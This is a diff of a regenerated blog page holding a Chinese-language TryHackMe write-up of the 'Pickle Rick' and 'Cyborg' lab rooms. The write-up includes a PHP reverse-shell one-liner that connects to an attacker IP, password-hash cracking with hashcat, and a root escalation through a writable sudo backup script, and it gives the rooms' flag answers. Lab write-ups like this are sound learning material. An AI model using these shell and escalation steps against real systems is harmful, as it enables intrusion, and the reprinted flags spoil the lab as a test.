@@ -54,15 +54,15 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1723545465131">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1723795549886">
 
-<link rel="stylesheet" href="/css/style.css?v=1723545465131">
+<link rel="stylesheet" href="/css/style.css?v=1723795549886">
 
 
 
 
     
-        <link rel="stylesheet" href="/custom.css?v=1723545465131">
+        <link rel="stylesheet" href="/custom.css?v=1723795549886">
     
 
 
@@ -72,7 +72,7 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1723545465131"></script>
+<script async src="/js/app.js?v=1723795549886"></script>
 
  
 
@@ -148,7 +148,7 @@
 </div>
 
 
-	<script async src="/js/search.js?v=1723545465132"></script>
+	<script async src="/js/search.js?v=1723795549887"></script>
 
 
 
@@ -305,7 +305,7 @@
             <a class="nexmoefont icon-appstore-fill -link" href="/categories/Try-Hack-Me/">Try Hack Me</a>
         
         
-    <a><i class="nexmoefont icon-areachart"></i>约858字</a>
+    <a><i class="nexmoefont icon-areachart"></i>约856字</a>
     <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要3分钟</a>
 
     </div>
@@ -320,16 +320,16 @@
 <p>记录下try hack me的学习之路</p>
 </blockquote>
 <span id="more"></span>
-
-
 <ul>
-<li><a href="#pickle-rick">Pickle Rick</a><ul>
+<li><a href="#pickle-rick">Pickle Rick</a>
+<ul>
 <li><a href="#flag1">flag1</a></li>
 <li><a href="#flag2">flag2</a></li>
 <li><a href="#flag3">flag3</a></li>
 </ul>
 </li>
-<li><a href="#cyborg">Cyborg</a><ul>
+<li><a href="#cyborg">Cyborg</a>
+<ul>
 <li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
 <li><a href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">暴力破解</a></li>
 <li><a href="#flag1-1">flag1</a></li>
@@ -337,69 +337,95 @@
 </ul>
 </li>
 </ul>
-<h1 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h1><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle1.png" alt="题目" data-caption="题目" loading="lazy">  </p>
+<h1>Pickle Rick</h1>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle1.png" alt="题目" data-caption="题目" loading="lazy"></p>
 <p>需要寻找三部分flag</p>
 <hr>
-<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>首先打开题目,什么也没有,按F12看到用户名<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle2.png" alt="1" data-caption="1" loading="lazy">  </p>
+<h3 id="flag1">flag1</h3>
+<p>首先打开题目,什么也没有,按F12看到用户名<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle2.png" alt="1" data-caption="1" loading="lazy"></p>
 <p>然后信息收集:</p>
 <ol>
 <li>nmap扫描发现只开了两个端口:22,80</li>
-<li>dirsearch扫描发现可疑文件<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle3.png" alt="2" data-caption="2" loading="lazy"></li>
+<li>dirsearch扫描发现可疑文件<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle3.png" alt="2" data-caption="2" loading="lazy"></li>
 </ol>
-<p>访问robots.txt 看到一串字符串: <strong>Wubbalubbadubdub</strong>，猜测是密码<br>访问login.php 使用用户名和密码登录<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle4.png" alt="3" data-caption="3" loading="lazy">  </p>
-<p>是一个命令执行窗口，输入<strong>ls</strong>看看<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle5.png" alt="4" data-caption="4" loading="lazy">  </p>
-<p><strong>cat</strong>一下第一个txt文件发现被过滤，使用经典的绕过：<strong>tac</strong><br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle6.png" alt="5" data-caption="5" loading="lazy"><br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle7.png" alt="6" data-caption="6" loading="lazy"><br>得到第一个flag：<strong>mr. meeseek hair</strong>  </p>
-<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>接着tac其他文件发现并无关键信息<br>clue.txt 内容：<strong>Look around the file system for the other ingredient.</strong><br>defined.php为：<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle8.png" alt="7" data-caption="7" loading="lazy"><br>显然，权限不够<br>于是思考反弹shell到攻击机，使用php语言<br><code>php -r &#39;$sock=fsockopen(&quot;10.8.39.215&quot;,9999);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</code><br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickleshell.png" alt="shell" data-caption="shell" loading="lazy"><br>反弹成功，并发现可以直接使用sudo su 变成root权限<br>然后就是随心所欲了，cd &#x2F;home发现rick，进一步拿到第二个flag: <strong>1 jerry tear</strong><br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickleshell2.png" alt="shell2" data-caption="shell2" loading="lazy">  </p>
-<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>根据直接提权到root猜测最后一个flag在root目录下（让我们一开始不是root的时候访问不了）<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickleshell3.png" alt="shell3" data-caption="shell3" loading="lazy"><br>拿到最后一个flag：<strong>fleeb juice</strong></p>
+<p>访问robots.txt 看到一串字符串: <strong>Wubbalubbadubdub</strong>，猜测是密码<br>
+访问login.php 使用用户名和密码登录<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle4.png" alt="3" data-caption="3" loading="lazy"></p>
+<p>是一个命令执行窗口，输入<strong>ls</strong>看看<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle5.png" alt="4" data-caption="4" loading="lazy"></p>
+<p><strong>cat</strong>一下第一个txt文件发现被过滤，使用经典的绕过：<strong>tac</strong><br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle6.png" alt="5" data-caption="5" loading="lazy"><br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle7.png" alt="6" data-caption="6" loading="lazy"><br>
+得到第一个flag：<strong>mr. meeseek hair</strong></p>
+<h3 id="flag2">flag2</h3>
+<p>接着tac其他文件发现并无关键信息<br>
+clue.txt 内容：<strong>Look around the file system for the other ingredient.</strong><br>
+defined.php为：<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickle8.png" alt="7" data-caption="7" loading="lazy"><br>
+显然，权限不够于是思考反弹shell到攻击机，使用php语言<code>php -r '$sock=fsockopen(&quot;10.8.39.215&quot;,9999);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'</code><br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickleshell.png" alt="shell" data-caption="shell" loading="lazy"><br>
+反弹成功，并发现可以直接使用sudo su 变成root权限<br>
+然后就是随心所欲了，cd /home发现rick，进一步拿到第二个flag: <strong>1 jerry tear</strong><br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickleshell2.png" alt="shell2" data-caption="shell2" loading="lazy"></p>
+<h3 id="flag3">flag3</h3>
+<p>根据直接提权到root猜测最后一个flag在root目录下（让我们一开始不是root的时候访问不了）<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-pickle/pickleshell3.png" alt="shell3" data-caption="shell3" loading="lazy"><br>
+拿到最后一个flag：<strong>fleeb juice</strong></p>
 <pre><code>总结：这个还是很好玩的，体会到一步步寻找的乐趣，而且也非常简单，适合初学者熟悉大致流程。
 </code></pre>
 <hr>
-<h1 id="Cyborg"><a href="#Cyborg" class="headerlink" title="Cyborg"></a>Cyborg</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先用nmap扫描开放端口信息，枚举端口上运行的服务</p>
-<p><img src="/images/zhaopian/thm-cyborg/99409.png"></p>
+<h1>Cyborg</h1>
+<h3 id="信息收集">信息收集</h3>
+<p>先用nmap扫描开放端口信息，枚举端口上运行的服务</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/99409.png" alt="" data-caption="" loading="lazy"></p>
 <p>访问80端口是个apache默认页面，用dirb扫描一下网站目录</p>
-<p>发现两个比较可疑的目录&#x2F;admin和&#x2F;etc</p>
-<p><img src="/images/zhaopian/thm-cyborg/67673.png"></p>
+<p>发现两个比较可疑的目录/admin和/etc</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/67673.png" alt="" data-caption="" loading="lazy"></p>
 <p>再用dirbuster扫一遍目录，得到一个压缩包archive.tar，我以为是源码之类的，打开发现不是。</p>
-<p><img src="/images/zhaopian/thm-cyborg/39391.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/39391.png" alt="" data-caption="" loading="lazy"></p>
 <p>现招其它线索，admin.html里有些聊天记录，这里有几个民资Josh、adam、alex</p>
 <p>还有一个被描述的很重要的东西叫music_archive</p>
-<p><img src="/images/zhaopian/thm-cyborg/60558.png"></p>
-<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>随后在&#x2F;etc目录下发现了这个东西，看起来像是一串密文，特征还比较明显</p>
-<p><img src="/images/zhaopian/thm-cyborg/26075.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/60558.png" alt="" data-caption="" loading="lazy"></p>
+<h3 id="暴力破解">暴力破解</h3>
+<p>随后在/etc目录下发现了这个东西，看起来像是一串密文，特征还比较明显</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/26075.png" alt="" data-caption="" loading="lazy"></p>
 <p>打开hashcat的密文类型进行匹配，匹配到1600 $apr1$</p>
 <p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
-<p><img src="/images/zhaopian/thm-cyborg/89430.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/89430.png" alt="" data-caption="" loading="lazy"></p>
 <p>用hashcat暴力破解</p>
-<p><img src="/images/zhaopian/thm-cyborg/02891.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/02891.png" alt="" data-caption="" loading="lazy"></p>
 <p>暴力匹配rockyou得到明文，用这个密码ssh试了所有得到的类似用户的账号都没有进去。</p>
-<p><img src="/images/zhaopian/thm-cyborg/25450.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/25450.png" alt="" data-caption="" loading="lazy"></p>
 <p>再回到之前的tar文件，里面有个README，里面指向一个域名</p>
-<p><img src="/images/zhaopian/thm-cyborg/27379.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/27379.png" alt="" data-caption="" loading="lazy"></p>
 <p>访问一下，理解大概是一个文件储存仓库的东西</p>
-<p><img src="/images/zhaopian/thm-cyborg/20937.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/20937.png" alt="" data-caption="" loading="lazy"></p>
 <p>再github上也找到了相关的项目，这里有个安装包，我们下载来看看</p>
-<p><img src="/images/zhaopian/thm-cyborg/74815.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/74815.png" alt="" data-caption="" loading="lazy"></p>
 <p>运行borg就会出现帮助文档</p>
-<p><img src="/images/zhaopian/thm-cyborg/60113.png"></p>
-<h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>根据文档用list 查看目录下的文件，密码用刚刚破解得到的hash，有个music_archive</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/60113.png" alt="" data-caption="" loading="lazy"></p>
+<h3 id="flag1-2">flag1</h3>
+<p>根据文档用list 查看目录下的文件，密码用刚刚破解得到的hash，有个music_archive</p>
 <p>用extract提取出来，密码一样。得到一个alex的文件</p>
-<p><img src="/images/zhaopian/thm-cyborg/08924.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/08924.png" alt="" data-caption="" loading="lazy"></p>
 <p>看下alex的目录结构类似于“home”目录</p>
-<p><img src="/images/zhaopian/thm-cyborg/94613.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/94613.png" alt="" data-caption="" loading="lazy"></p>
 <p>翻了目录得到alex的账号和密码</p>
-<p><img src="/images/zhaopian/thm-cyborg/82615.png"></p>
-<p>ssh上去直接拿到第一个flag  </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/82615.png" alt="" data-caption="" loading="lazy"></p>
+<p>ssh上去直接拿到第一个flag</p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/12345.png" alt="flag1" data-caption="flag1" loading="lazy"></p>
-<h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>使用sudo -l查看具有sudo权限的命令，有个&#x2F;etc&#x2F;mp3backups&#x2F;backup.sh</p>
+<h3 id="flag2-2">flag2</h3>
+<p>使用sudo -l查看具有sudo权限的命令，有个/etc/mp3backups/backup.sh</p>
 <p>查看文件所有者是alex，加个可写权限</p>
-<p><img src="/images/zhaopian/thm-cyborg/56804.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/56804.png" alt="" data-caption="" loading="lazy"></p>
 <p>在文件中加入反弹shell命令</p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/60495.png" alt="shell" data-caption="shell" loading="lazy"></p>
 <p>攻击机上起监听，没一会shell 就过来了</p>
 <p>登录后crontab -l看下定时任务，</p>
 <p>发现backup.sh在定时任务中</p>
 <p>成功拿到root</p>
-<p><img src="/images/zhaopian/thm-cyborg/44276.png"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/thm-cyborg/44276.png" alt="" data-caption="" loading="lazy"></p>
 <p>flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}</p>
 
     
@@ -418,7 +444,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1723545464906"></script>
+    <script async src="/js/copy-codeblock.js?v=1723795549664"></script>
   
 
   
@@ -451,7 +477,7 @@
             <button class="mdui-fab catalog" style="overflow:unset;">
                 <i class="nexmoefont icon-i-catalog"></i>
                 <div class="nexmoe-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle-Rick"><span class="toc-number">1.</span> <span class="toc-text">Pickle Rick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">1.0.1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-number">1.0.2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">1.0.3.</span> <span class="toc-text">flag3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cyborg"><span class="toc-number">2.</span> <span class="toc-text">Cyborg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.0.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.0.2.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1-1"><span class="toc-number">2.0.3.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-1"><span class="toc-number">2.0.4.</span> <span class="toc-text">flag2</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Pickle Rick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">1.0.1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-number">1.0.2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">1.0.3.</span> <span class="toc-text">flag3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Cyborg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.0.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.0.2.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1-2"><span class="toc-number">2.0.3.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-2"><span class="toc-number">2.0.4.</span> <span class="toc-text">flag2</span></a></li></ol></li></ol></li></ol>
                 </div>
             </button>
             
